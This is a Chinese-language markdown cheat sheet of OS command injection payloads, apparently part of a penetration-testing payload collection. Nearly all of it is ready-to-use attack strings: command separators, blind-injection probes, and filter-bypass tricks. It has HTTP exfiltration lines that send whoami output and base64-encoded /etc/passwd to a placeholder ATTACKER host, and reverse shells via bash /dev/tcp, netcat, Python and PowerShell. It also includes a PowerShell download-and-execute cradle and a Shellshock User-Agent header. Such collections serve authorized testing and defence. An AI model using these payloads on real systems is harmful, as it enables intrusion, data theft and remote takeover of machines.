<a id="-command-injection-payloads"></a>
# 💻 命令注入载荷

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./Command-Injection.tr.md) • [🇬🇷 Ελληνικά](./Command-Injection.el.md)

```
 ██████╗ ███████╗     ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ 
██╔═══██╗██╔════╝    ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗
██║   ██║███████╗    ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║
██║   ██║╚════██║    ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║
╚██████╔╝███████║    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝
 ╚═════╝ ╚══════╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗                   
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║                   
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║                   
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║                   
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║                   
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                   
```

---

<a id="-command-separators"></a>
## 🎯 命令分隔符

<a id="linuxunix"></a>
### Linux/Unix
```bash
;       # 分号：前一命令结束后执行
|       # 管道：将输出传给下一命令
||      # 逻辑或：前一命令失败时执行
&       # 后台执行
&&      # 逻辑与：前一命令成功时执行
`cmd`   # 反引号：命令替换
$(cmd)  # 美元符号语法：命令替换
\n      # 换行符：分隔命令
```

<a id="windows"></a>
### Windows
```cmd
;       # 某些环境下有效
|       # 管道
||      # 逻辑或
&       # 执行两条命令
&&      # 逻辑与
\n      # 换行符
%0a     # URL 编码的换行符
```

---

<a id="-basic-payloads"></a>
## 💉 基本载荷

<a id="simple-test"></a>
### 简单测试
```bash
; id
; whoami
| id
| whoami
|| id
|| whoami
& id
& whoami
&& id
&& whoami
`id`
$(id)
```

<a id="url-encoded"></a>
### URL 编码
```
%3B+id               # ; id
%7C+id               # | id
%7C%7C+id            # || id
%26+id               # & id
%26%26+id            # && id
%0A+id               # 换行符 + id
```

---

<a id="-blind-command-injection"></a>
## 🔥 命令盲注

<a id="time-based-detection"></a>
### 基于时间的检测
```bash
# 延时命令
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)

# Windows
; ping -n 5 127.0.0.1
| timeout 5
```

<a id="dns-based-detection"></a>
### 基于 DNS 的检测
```bash
# 使用 nslookup
; nslookup BURP_COLLAB
| nslookup BURP_COLLAB
`nslookup BURP_COLLAB`
$(nslookup BURP_COLLAB)

# 使用 curl/wget
; curl http://BURP_COLLAB
; wget http://BURP_COLLAB
$(curl http://ATTACKER/?data=$(whoami))
```

<a id="http-based-exfiltration"></a>
### 通过 HTTP 外传数据
```bash
; curl http://ATTACKER/$(whoami)
; curl http://ATTACKER/?d=$(cat /etc/passwd | base64)
; wget http://ATTACKER/$(hostname)
$(curl http://ATTACKER/?id=$(id))
`curl http://ATTACKER/?user=$(whoami)`
```

---

<a id="-filter-bypass-techniques"></a>
## 🛡️ 过滤绕过技巧

<a id="space-bypass"></a>
### 空格过滤绕过
```bash
# 使用 $IFS（内部字段分隔符）
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;{cat,/etc/passwd}

# 使用制表符
;cat	/etc/passwd

# 使用大括号
{cat,/etc/passwd}
```

<a id="keyword-bypass"></a>
### 关键词过滤绕过
```bash
# 拆分命令
w'h'oami
w"h"oami
who$@ami
who\ami

# 使用通配符
/bin/ca? /etc/passwd
/bin/c?t /etc/passwd
/b??/c?t /etc/passwd

# 使用变量
$u; cat /etc/passwd
test=cat; $test /etc/passwd

# 十六进制编码
echo -e "\x69\x64" | sh    # id
```

<a id="special-character-bypass"></a>
### 特殊字符过滤绕过
```bash
# 使用不同分隔符
;{cat,/etc/passwd}
;cat</etc/passwd
;cat$IFS/etc/passwd

# 换行符注入
%0aid
%0Acat%20/etc/passwd

# 使用注释
; id #
| id #
```

---

<a id="-linux-payloads"></a>
## 🐧 Linux 载荷

<a id="file-reading"></a>
### 文件读取
```bash
; cat /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; less /etc/passwd
; more /etc/passwd
; nl /etc/passwd
; sort /etc/passwd
; uniq /etc/passwd
; strings /etc/passwd
; od -c /etc/passwd
; xxd /etc/passwd
; base64 /etc/passwd
```

<a id="command-execution"></a>
### 命令执行
```bash
; id
; whoami
; uname -a
; hostname
; pwd
; ls -la
; env
; ps aux
; netstat -an
; ifconfig
; ip addr
```

<a id="reverse-shell"></a>
### 反向 Shell
```bash
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; nc -e /bin/sh ATTACKER 4444
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

---

<a id="-windows-payloads"></a>
## 🪟 Windows 载荷

<a id="basic-commands"></a>
### 基本命令
```cmd
& whoami
& hostname
& ipconfig
& net user
& dir
& type C:\Windows\win.ini
& type C:\Windows\System32\drivers\etc\hosts
```

<a id="file-reading-1"></a>
### 文件读取
```cmd
& type C:\Windows\win.ini
& type C:\inetpub\wwwroot\web.config
& more C:\Windows\win.ini
& find "password" C:\path\to\file.txt
```

<a id="powershell"></a>
### PowerShell
```powershell
& powershell -c "whoami"
& powershell -c "Get-Process"
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"
```

<a id="reverse-shell-1"></a>
### 反向 Shell
```cmd
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

<a id="-common-injection-points"></a>
## 📝 常见注入点

```
URL 参数：
  ?ip=127.0.0.1;id
  ?file=test.txt|id
  ?cmd=ls

POST 参数：
  filename=test.txt;id
  host=localhost|whoami

请求头：
  User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
  X-Forwarded-For: ;id

上传文件名：
  test;id;.txt
  test$(id).txt
  test`id`.txt
```

---

<a id="-testing-checklist"></a>
## 📋 测试清单

```markdown
□ 测试所有命令分隔符 (; | || & && ` $())
□ 测试 URL 编码形式
□ 测试基于时间的盲注
□ 测试 DNS/HTTP 数据外传
□ 测试空格绕过（$IFS、制表符、大括号）
□ 测试关键词绕过（引号、通配符）
□ 测试换行符注入（%0a）
□ 检查哪些字符受到过滤
□ 分别尝试 Linux 和 Windows 命令
```

---

<a id="-related-payloads"></a>
## 🔗 相关载荷

- [LFI 载荷](./LFI.zh-CN.md)
- [SSTI 载荷](./SSTI.zh-CN.md)

---

**返回载荷目录：** 原文所指的载荷索引不可用（`./README.md`）；本目录没有英文 README，故未创建翻译索引。
